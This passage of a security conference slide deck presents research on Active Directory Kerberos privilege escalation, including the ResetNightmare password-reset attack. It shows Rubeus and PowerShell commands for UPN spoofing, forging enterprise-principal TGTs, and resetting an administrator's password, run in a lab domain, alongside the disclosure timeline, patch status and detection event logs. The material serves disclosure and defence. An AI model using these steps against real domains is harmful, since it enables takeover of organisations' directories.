ASREP (key)  : 64F12CDDAA88057E06A81B54E73B949B
```

## Slide 50

```text
PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmin1@demo.lab"
Set-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
At line:1 char:1
+ Set-ADUser UPNUser -UserPrincipalName "DemoAdmin1@demo.lab"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8648,Microsoft.ActiveDirectory.Management.Commands.SetADUser

PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmin1"
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "userprincipalname=DemoAdmin1*" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                     SamAccountName UserPrincipalName
----------------                     -------------- -----------------
CN=UPNUser,CN=Users,DC=demo,DC=lab    UPNUser        DemoAdmin1
CN=DemoAdmin1,OU=Admin,DC=demo,DC=lab DemoAdmin1     DemoAdmin1@demo.lab
```

## Slide 51

```text
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:DemoAdmin1 /password:Password1 /nowrap /suppenctype:AES256

  [Rubeus ASCII-art banner]

    v2.3.3

[*] Action: Ask TGT

[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88057E06A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: 'demo.lab\DemoAdmin1'
[*] Using domain controller: 192.168.0.11:88

[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED:
```

## Slide 52

```text
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:DemoAdmin1 /password:Password1 /nowrap /suppenctype:AES256 /principaltype:enterprise

  [Rubeus ASCII-art banner]

    v2.3.3

[*] Action: Ask TGT

[*] Got domain: demo.lab
[*] Using rc4_hmac hash: 64F12CDDAA88057E06A81B54E73B949B
[*] Building AS-REQ (w/ preauth) for: 'demo.lab\DemoAdmin1'
[*] Using domain controller: 192.168.0.11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      [base64 ticket.kirbi blob — not transcribed]

ServiceName  : krbtgt/demo.lab
ServiceRealm : DEMO.LAB
UserName     : DemoAdmin1 (NT_ENTERPRISE)
UserRealm    : DEMO.LAB
StartTime    : 7/6/2026 2:50:39 AM
EndTime      : 7/6/2026 12:50:39 PM
RenewTill    : 7/13/2026 2:50:39 AM
Flags        : name_canonicalize, pre_authent, initial, renewable, forwardable
KeyType      : aes256_cts_hmac_sha1
Base64(key)  : cvUmXQTTLeKc8cLNdUGijsq6UKdNRbQuVkxQkRVH8Tk=
ASREP (key)  : 64F12CDDAA88057E06A81B54E73B949B
```

**Decode of encTicketPart (overlay panel):**

```text
encTicketPart
  Padding: 0
> flags: 40e10000
> key
  crealm: DEMO.LAB
v cname
    name-type: kRB5-NT-ENTERPRISE-PRINCIPAL (10)
  v cname-string: 1 item
      CNameString: DemoAdmin1
```

**Callout:** `UserName  :  DemoAdmin1 (NT_ENTERPRISE)`

## Slide 53

*Meme photo: Borat (Sacha Baron Cohen) in a grey suit, both fists raised in celebration.*

**GREAT SUCCESS!**

## Slide 54

*Meme photo: Borat (Sacha Baron Cohen) in a grey suit, both fists raised in celebration; the exclamation mark is boxed over and replaced.*

**GREAT SUCCESS?**

## Slide 55

### PREVIOUS PATCH #2: CVE-2021-42287

Dollar Ticket / noPac

## Slide 56

### PREVIOUS PATCH #2: CVE-2021-42287

- TGTs always have a PAC
- PAC_REQUESTOR_SID

> **3.3.5.7 TGS Exchange**
>
> If the **PAC_REQUESTOR** SID is present in the PAC and the client is from the KDC's realm, the KDC MUST verify that the **cname** on the ticket resolves to an account with the same SID as the **PAC_REQUESTOR** SID (see section 3.3.5.6.1). If it does not, the KDC MUST return KDC_ERR_TGT_REVOKED.

## Slide 57

### PREVIOUS PATCH #2: CVE-2021-42287

```text
Decrypted PAC              :
  (...)
  ClientName               :
    Client Id              : 7/6/2026 2:50:39 AM
    Client Name            : DemoAdmin1
  UpnDns                   :
    DNS Domain Name        : DEMO.LAB
    UPN                    : DemoAdmin1
    Flags                  : (2) EXTENDED
    SamName                : UPNUser
    Sid                    : S-1-5-21-2654527649-3002338432-417080399-1116
  Attributes               :
    AttributeLength        : 2
    AttributeFlags         : (1) PAC_WAS_REQUESTED
  Requestor                :
    RequestorSID           : S-1-5-21-2654527649-3002338432-417080399-1116
```

## Slide 58

### PREVIOUS PATCH #2: CVE-2021-42287

```text
Decrypted PAC              :
  (...)
  ClientName               :
    Client Id              : 7/6/2026 2:50:39 AM
    Client Name            : DemoAdmin1
  UpnDns                   :
    DNS Domain Name        : DEMO.LAB
    UPN                    : DemoAdmin1
    Flags                  : (2) EXTENDED
    SamName                : UPNUser
    Sid                    : S-1-5-21-2654527649-3002338432-417080399-1116
  Attributes               :
    AttributeLength        : 2
    AttributeFlags         : (1) PAC_WAS_REQUESTED
  Requestor                :
    RequestorSID           : S-1-5-21-2654527649-3002338432-417080399-1116
```

```text
  Requestor                :
    RequestorSID           : S-1-5-21-2654527649-3002338432-417080399-1116

PS C:\Users\notadmin\Desktop> Get-ADUser -Identity S-1-5-21-2654527649-3002338432-417080399-1116 |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                  SamAccountName UserPrincipalName
----------------                  -------------- -----------------
CN=UPNUser,CN=Users,DC=demo,DC=lab UPNUser        DemoAdmin1
```

## Slide 59

### PREVIOUS PATCH #2: CVE-2021-42287

```text
PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dc01 /nowrap

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'ldap/dc01'
[*] Using domain controller: DC01.demo.lab (192.168.0.11)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      [base64 ticket.kirbi blob — not transcribed]

ServiceName  : ldap/dc01
ServiceRealm : DEMO.LAB
UserName     : DemoAdmin1 (NT_ENTERPRISE)
UserRealm    : DEMO.LAB
StartTime    : 7/7/2026 5:14:23 AM
EndTime      : 7/7/2026 3:12:53 PM
RenewTill    : 7/14/2026 5:12:53 AM
Flags        : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
KeyType      : aes256_cts_hmac_sha1
Base64(key)  : h2/PJL2b5AhvirTkfqIqNGOD0Kz5rsWbLSnUG2WX5zs=
```

## Slide 60

### PREVIOUS PATCH #2: CVE-2021-42287

```text
ClientName                 :
  Client Id                : 7/7/2026 5:12:53 AM
  Client Name              : DemoAdmin1
UpnDns                     :
  DNS Domain Name          : DEMO.LAB
  UPN                      : DemoAdmin1
  Flags                    : (2) EXTENDED
  SamName                  : UPNUser
  Sid                      : S-1-5-21-2654527649-3002338432-417080399-1116
```

## Slide 61

### PREVIOUS PATCH #2: CVE-2021-42287

```text
PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -Clear UserPrincipalName
PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "userprincipalname=DemoAdmin1*" -Properties SamAccountName,UserPrincipalName |
>> select DistinguishedName, SamAccountName, UserPrincipalName

DistinguishedName                     SamAccountName UserPrincipalName
-----------------                     -------------- -----------------
CN=DemoAdmin1,OU=Admin,DC=demo,DC=lab DemoAdmin1     DemoAdmin1@demo.lab


PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dc01 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

   v2.3.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'ldap/dc01'
[*] Using domain controller: DC01.demo.lab (192.168.0.11)

[X] KRB-ERROR (20) : KDC_ERR_TGT_REVOKED
```

## Slide 62

*Reaction meme (a video still shown as two halves). Left: a man captioned "Me" walking past a woman captioned "Privilege Escalation". Right: two men, one captioned "PAC_REQUESTOR_SID".*

## Slide 63

### THE KERBEROS CHANGE PASSWORD PROTOCOL

- By default, every AD user can change their own password

```text
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         message length        |    protocol version number    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         AP_REQ length         |          AP_REQ data          /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
/                       KRB-PRIV message                        /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

## Slide 64

### THE KERBEROS CHANGE PASSWORD PROTOCOL

```text
The user-data component of the message consists of the following
ASN.1 structure encoded as an OCTET STRING:

    ChangePasswdData ::=  SEQUENCE {
                          newpasswd[0]   OCTET STRING,
                          targname[1]    PrincipalName OPTIONAL,
                          targrealm[2]   Realm OPTIONAL
                          }
```

## Slide 65

### THE KERBEROS CHANGE PASSWORD PROTOCOL

```text
AP-REQ          ::= [APPLICATION 14] SEQUENCE {
        pvno            [0] INTEGER (5),
        msg-type        [1] INTEGER (14),
        ap-options      [2] APOptions,
        ticket          [3] Ticket,
        authenticator   [4] EncryptedData -- Authenticator
}
```

## Slide 66

### THE KERBEROS CHANGE PASSWORD PROTOCOL

```text
AP-REQ data: (see [1]) The AP-REQ message must be for the service
principal kadmin/changepw@REALM
```

```text
PS C:\Users\notadmin\Desktop> Get-ADUser krbtgt -Properties ServicePrincipalName |
>> select SamAccountName, ServicePrincipalName

SamAccountName ServicePrincipalName
-------------- --------------------
krbtgt         {kadmin/changepw}
```

- Reminder: only the encryption key matters; this is just a TGT with the SPN changed to kadmin/changepw

## Slide 67

### THE KERBEROS CHANGE PASSWORD PROTOCOL

*Sequence diagram between actors **User** and **DC**:*

- User -> DC: TGT request (+ pre-authentication data)
- DC -> User: TGT
- User: Build request message
- User -> DC: Kerberos Change Password request (port 464)
- DC -> User: SUCCESS

## Slide 68

### THE KERBEROS CHANGE PASSWORD PROTOCOL

**TGT-REQ → AP-REQ**

**No TGS-REQ!**

*Sequence diagram between actors **User** and **DC**:*

- User -> DC: TGT request (+ pre-authentication data)
- DC -> User: TGT
- User: Build request message
- User -> DC: Kerberos Change Password request (port 464)
- DC -> User: SUCCESS

Callout box (excerpt, pointing at "No TGS-REQ!"):

> **3.3.5.7 TGS Exchange**
> If the **PAC_REQUESTOR** SID is present in the PAC and the client is from the KDC's realm, the KDC MUST verify that the **cname** on the ticket resolves to an account with the same SID as the **PAC_REQUESTOR** SID (see section 3.3.5.6.1). If it does not, the KDC MUST return KDC_ERR_TGT_REVOKED.

## Slide 69

Attacker
DC
The attacker has
WriteUPN on self
The attacker sets his UPN to the SamAccountName of the target account, e.g. Administrator
SamAccountName: Attacker
UserPrincipalName: Administrator
The attacker requests a TGT for Administrator with a name-type of NT-ENTERPRISE
TGT
Change the ticket’s
SPN to kadmin/changepw
Clear / Restore UPN
SamAccountName: Attacker
UserPrincipalName:
Reset password using the TGT for "Administrator"
Verify AP-REQ message
Can Administrator reset
own password?
Success?

## Slide 70

*Full-screen "Administrator: Windows PowerShell" terminal screenshot.*

```text
PS C:\Users\Attacker\Desktop> hostname
Host1
PS C:\Users\Attacker\Desktop> whoami
demo\attacker
PS C:\Users\Attacker\Desktop> Get-ADUser attacker -Properties memberof,primarygroupid | select Name,MemberOf,primarygroupid,UserPrincipalName

Name     MemberOf primarygroupid UserPrincipalName
----     -------- -------------- -----------------
attacker {}                  513 attacker@demo.lab


PS C:\Users\Attacker\Desktop>
```

## Slide 71

# ResetNightmare CVE-2026-27912

## Slide 72

ResetNightmare: CVE-2026-27912

If an attacker could write to any user/computer, or create a new one*, **they could compromise the entire domain** .

* (not with MachineAccountQuota)

•Bonus – can be combined with ShadowCreds

## Slide 73

### DISCLOSURE TIMELINE

- November 26, 2025: reported KerberLoss

- December 17, 2025: reported ResetNightmare

- January 9, 2026: MSRC confirms ResetNightmare works as reported

- January 17, 2026: MSRC confirms KerberLoss works as reported

- March 10, 2026: Microsoft patches KerberLoss

- April 14, 2026: Microsoft patches ResetNightmare

## Slide 74

### MITIGATION

•KerberLoss – Patched on March 2026 •ResetNightmare – Patched on April 2026

## Slide 75

DETECTION

## Slide 76

### DETECTION - KerberLoss

5136

```text
A directory service object was modified.

Subject:
	Security ID:		CHILD\ChildNotAdmin
	Account Name:		ChildNotAdmin
	Account Domain:		CHILD
	Logon ID:		0x1C2B301

Directory Service:
	Name:	child.demo.lab
	Type:	Active Directory Domain Services

Object:
	DN:	CN=childpac,OU=TestCreate,DC=child,DC=demo,DC=lab
	GUID:	CN=childpac,OU=TestCreate,DC=child,DC=demo,DC=lab
	Class:	computer

Attribute:
	LDAP Display Name:	servicePrincipalName
	Syntax (OID):	2.5.5.12
	Value:	TERMSRV/HOST01

Operation:
	Type:	Value Added
	Correlation ID:	{0f72e9cd-db20-42cf-83a7-06605f76cd36}
	Application Correlation ID:	-

Log Name:	Security
Source:	Microsoft Windows security	Logged:	7/15/2026 7:22:11 AM
Event ID:	5136	Task Category:	Directory Service Changes
```

## Slide 77

### DETECTION - ResetNightmare

5136

```text
A directory service object was modified.

Subject:
	Security ID:		S-1-5-21-2654527649-3002338432-417080399-1115
	Account Name:		NotAdmin
	Account Domain:		demo
	Logon ID:		0x250383C

Directory Service:
	Name:	demo.lab
	Type:	Active Directory Domain Services

Object:
	DN:	CN=NotAdmin,CN=Users,DC=demo,DC=lab
	GUID:	{e61c5575-9448-4449-8abb-dadc5f960e22}
	Class:	user

Attribute:
	LDAP Display Name:	userPrincipalName
	Syntax (OID):	2.5.5.12
	Value:	DemoAdmin1

Operation:
	Type:	Value Added
	Correlation ID:	{f409b44e-e580-4af2-a048-b62b9b0aaa85}
	Application Correlation ID: -
```

## Slide 78

### DETECTION - ResetNightmare

5136

```text
A directory service object was modified.

Subject:
	Security ID:		S-1-5-21-2654527649-3002338432-417080399-1115
	Account Name:		NotAdmin
	Account Domain:		demo
	Logon ID:		0x250383C

Directory Service:
	Name:	demo.lab
	Type:	Active Directory Domain Services

Object:
	DN:	CN=NotAdmin,CN=Users,DC=demo,DC=lab
	GUID:	{e61c5575-9448-4449-8abb-dadc5f960e22}
	Class:	user

Attribute:
	LDAP Display Name:	userPrincipalName
	Syntax (OID):	2.5.5.12
	Value:	DemoAdmin1

Operation:
	Type:	Value Deleted
	Correlation ID:	{f496a19c-17c9-4eec-adfb-b2ee30edcf15}
	Application Correlation ID: -
```

## Slide 79

### DETECTION - ResetNightmare

```text
Event Properties - Event 4723, Security-Auditing

General   Details

An attempt was made to change an account's password.

Subject:
	Security ID:		S-1-5-21-2654527649-3002338432-417080399-1115
	Account Name:		NotAdmin
	Account Domain:		demo
	Logon ID:		0x250E8C4

Target Account:
	Security ID:		S-1-5-21-2654527649-3002338432-417080399-1110
	Account Name:		DemoAdmin1
	Account Domain:		demo

Additional Information:
	Privileges		-

Log Name:	Security
Source:	Security-Auditing	Logged:	7/19/2026 2:22:44 AM
Event ID:	4723	Task Category:	User Account Management
Level:	Information	Keywords:	Audit Success
User:	N/A	Computer:	DC01.demo.lab
OpCode:	Info
```

## Slide 80

### ResetNighmare tool

<u>https://github.com/Semperis-Community/ResetNightmare</u>

```text
PS> Invoke-ResetNightmare -TargetAccount DemoAdmin1 -TargetNewPassword toolPassword1 -UPNUser pocUser -UPNUserPassword Password1 `
>> -CreateNewPath "OU=test,DC=demo,DC=lab" -DC DC01
[*] Creating user pocUser in OU=test,DC=demo,DC=lab...
[*] Getting Full Control rights on pocUser for notadmin
[*] Resetting pocUser's password to Password1
[*] Enabling pocUser...
[*] Setting a fake UPN for pocUser...
[*] Asking for a TGT for pocUser with the name DemoAdmin1 (NT_ENTERPRISE) for kadmin/changepw...
[*] Clearing fake UPN from pocUser...
[*] Attempting to change DemoAdmin1's password to toolPassword1...
[*] Cleaning up files...

Success! You can now authenticate as DemoAdmin1 with the password toolPassword1
To spawn a new netonly process:
Rubeus.exe asktgt /user:DemoAdmin1 /password:toolPassword1 /suppenctype:AES256 /nowrap /createnetonly:cmd.exe /show
```

## Slide 81

### ACKNOWLEDGEMENTS

•Yossi Sassi (@Yossi_Sassi) •Andrew Bartlett •Elad Shamir (@elad_shamir) •Charlie Clark (@exploitph) •Will Schroeder (@harmj0y) •Andrea Pierini (@decoder_it) •Benjamin Delpy (@gentilkiwi)

## Slide 82

### KEY TAKEAWAYS

•Stick to the Principle of Least Privilege •Don’t assume “Tier-0” == “Zero threat” •Researchers: Stay curious

## Slide 83

#### To read our full write-up:

Thank you! Questions?
